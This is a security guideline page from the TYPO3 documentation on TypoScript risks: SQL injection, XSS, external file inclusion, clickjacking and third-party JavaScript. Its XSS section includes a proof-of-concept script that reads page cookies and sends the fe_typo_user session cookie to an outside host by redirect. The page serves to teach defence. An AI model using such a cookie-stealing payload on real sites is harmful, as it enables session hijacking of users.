.. include:: /Includes.rst.txt
.. index:: pair: Security guidelines; TypoScript
.. _security-typoscript:

==========
TypoScript
==========


.. index::
   SQL injection
   pair: TypoScript; SQL injection
   pair: Security guidelines; SQL injection

SQL injection
=============

The `CWE/SANS list <http://cwe.mitre.org/top25/>`_ of top 25 most dangerous software
errors ranks "SQL injection" first! The TYPO3 Security Team comes across this security
vulnerability in TYPO3 extensions over and over again.

On the PHP side, this situation improved a lot in TYPO3 with the :ref:`doctrine API <database>`
using prepared statements with
:ref:`createNamedParameter() <database-query-builder-create-named-parameter>`,
:ref:`quoteIdentifier() <database-query-builder-quote-identifier>` and
:ref:`escapeLikeWildcards() <database-query-builder-escape-like-wildcards>`.

But TYPO3 integrators (and everyone who writes code using `TypoScript`) should be
warned that due to the sophistication of TYPO3's configuration
language, SQL injections are also possible in `TypoScript`, for example
using the :ref:`CONTENT <t3tsref:cobj-content>` content object and building
the SQL query with values from the GET/POST request.

The following code snippet gives an example:

.. code-block:: typoscript

   page = PAGE
   page.10 = CONTENT
   page.10 {
     table = tt_content
     select {
       pidInList = 123
       where = deleted=0 AND uid=###PAGEID###
       markers {
           PAGEID.data = GP:pageid
       }
     }
   }

Argument passed by the `GET` / `POST` request `pageid` wrapped as markers are properly
escaped and quoted to prevent SQL injection problems.

See :ref:`TypoScript Reference <t3tsref:select-markers>` for more
information.

As a rule, you cannot trust (and must not use) any data from a source
you do not control without proper verification and validation (e.g.
user input, other servers, etc.).

.. index::
   ! Cross-site scripting
   XSS
   pair: TypoScript; Cross-site scripting

Cross-site scripting (XSS)
==========================

Similar applies for XSS placed in `TypoScript` code. The following code
snippet gives an example:

.. code-block:: typoscript

   page = PAGE
   page.10 = COA
   page.10 {
     10 = TEXT
     10.value (
       <h1>XSS &#43; TypoScript - proof of concept</h1>
       <p>Submitting (harmless) cookie data to google.com in a few seconds...</p>
     )
     20 = TEXT
     20.value (
       <script type="text/javascript">
       document.write('<p>');
       // read cookies
       var i, key, data, cookies = document.cookie.split(";");
       var loc = window.location;
       for (i = 0; i < cookies.length; i++) {
         // separate key and value
         key = cookies[i].substr(0, cookies[i].indexOf("="));
         data = cookies[i].substr(cookies[i].indexOf("=") + 1);
         key = key.replace(/^\s+|\s+$/g,"");
         // show key and value
         document.write(unescape(key) + ': ' + unescape(data) + '<br />');
         // submit cookie data to another host
         if (key == 'fe_typo_user') {
           setTimeout(function() {
             loc = 'http://www.google.com/?q=' + loc.hostname ;
             window.location = loc + ':' + unescape(key) + ':' + unescape(data);
           }, 5000);
         }
       }
       document.write('</p>');
       </script>
     )
   }

TYPO3 outputs the `JavaScript` code in :typoscript:`page.10.20.value` on the page.
The script is executed on the client side (in the user's browser), reads
and displays all cookie name/value pairs. In the case that a cookie
named `fe_typo_user` exists, the cookie value will be passed to
google.com, together with some extra data.

This code snippet is harmless of course but it shows how malicious
code (e.g. JavaScript) can be placed in the HTML content of a page by
using `TypoScript`.


.. index:: Security guidelines; External files

External file inclusion
=======================

TYPO3 allows to include external files which implement `TypoScript`
code. Some integrators appreciate the option of having `TypoScript`
outside of TYPO3's backend because the files can be maintained in a
version control system and/or can be edited without the need to login
to TYPO3. A typical line to include an external TypoScript file looks like this:

.. code-block:: typoscript

   <INCLUDE_TYPOSCRIPT: source="FILE:fileadmin/setup/myConfig.typoscript">

It is obvious that this method introduces some serious security risks:
first, the file :file:`myConfig.typoscript` exists in a publicly accessible path
of the web server. Without any further protection, everyone who knows
or is able to guess the path/file name can access/download this file
which often causes an information disclosure.

In order to deny access to all files with the file ending :file:`.typoscript`, the
following Apache configuration could be used::

   <FilesMatch "\.typoscript">
     deny from all
   </FilesMatch>

However, external `TypoScript` files have another vulnerability: in the
case that an attacker manages to manipulate these files (e.g. via a
compromised FTP account), it is possible to compromise the TYPO3 system or
to place malicious code (e.g. XSS) in the output of the pages generated by the CMS.
This attack scenario even does not require access to the TYPO3 backend.

.. note::
    Having `TypoScript` files within :file:`fileadmin/` is bad for other reasons, too:
    :file:`fileadmin/` is for content only, managed by editors, but TypoScript as well
    as HTML templates, JavaScript, CSS and other types of files are "system" or "project"
    files and not content. All this should be placed in an instance specific "project" extension.


.. index::
   ! Clickjacking
   pair: TypoScript; Clickjacking

Clickjacking
============

Clickjacking is an attack scenario where an attacker tricks a web
user into clicking on a button or following a link different from what
the user believes he/she is clicking on. Please see
:ref:`clickjacking <security-administrators-furtheractions-clickjacking>` for further details.
It may be beneficial to include a HTTP header `X-Frame-Options` on
frontend pages to protect the TYPO3 website against this attack vector.
Please consult with your system administrator about pros and cons of
this configuration.

The following TypoScript adds the appropriate line to the HTTP header:

.. code-block:: typoscript

   config.additionalHeaders = X-Frame-Options: SAMEORIGIN


.. index:: Security guidelines; External JavaScript

Integrity of external JavaScript files
======================================

The TypoScript property :code:`integrity` has been introduced with TYPO3 v7. This
configuration allows integrators to specify a SRI hash in order to allow a verification
of the integrity of externally hosted JavaScript files. SRI (Sub-Resource Integrity) is a
`W3C specification <http://www.w3.org/TR/SRI/>`_ that allows web developers to ensure
that resources hosted on third-party servers have not been tampered with.

The TypoScript property can be used for the following :ref:`PAGE <t3tsref:page>` properties:

* :typoscript:`page.includeJSLibs`
* :typoscript:`page.includeJSFooterlibs`
* :typoscript:`includeJS`
* :typoscript:`includeJSFooter`

A typical example in TypoScript looks like:

.. code-block:: typoscript

   page {
     includeJS {
       jQuery = https://code.jquery.com/jquery-1.11.3.min.js
       jQuery.external = 1
       jQuery.disableCompression = 1
       jQuery.excludeFromConcatenation = 1
       jQuery.integrity = sha256-7LkWEzqTdpEfELxcZZlS6wAx5Ff13zZ83lYO2/ujj7g=
     }
   }


.. index:: Security guidelines; External JavaScript libraries

Risk of externally hosted JavaScript libraries
==============================================

In many cases, it makes perfect sense to include `JavaScript` libraries, which are
externally hosted. Like the example above, many libraries are hosted by CDN
providers (Content Delivery Network) from an external resource rather than the
own server or hosting infrastructure. This approach reduces the load and traffic
of your own server and may speed up the loading time for your end-users, in
particular if well-known libraries are used.

However, `JavaScript` libraries of any kind and nature, for example feedback,
comment or discussion forums, as well as user tracking, statistics, additional
features, etc. which are hosted *somewhere*, can be compromised, too.

If you include a `JavaScript` library that is hosted under
:code:`https://example.com/js/feedback.js` and the systems of operator of
:code:`example.com` are compromised, your site and your site visitors are under
risk, too.

`JavaScript` running in the browser of your end-users is able to intercept any
input, for example sensitive data such as personal details, credit card numbers,
etc. From a security perspective, it it recommended to either not to use
externally hosted `JavaScript` files or to only include them on pages, where
necessary. On pages, where users enter data, they should be removed.
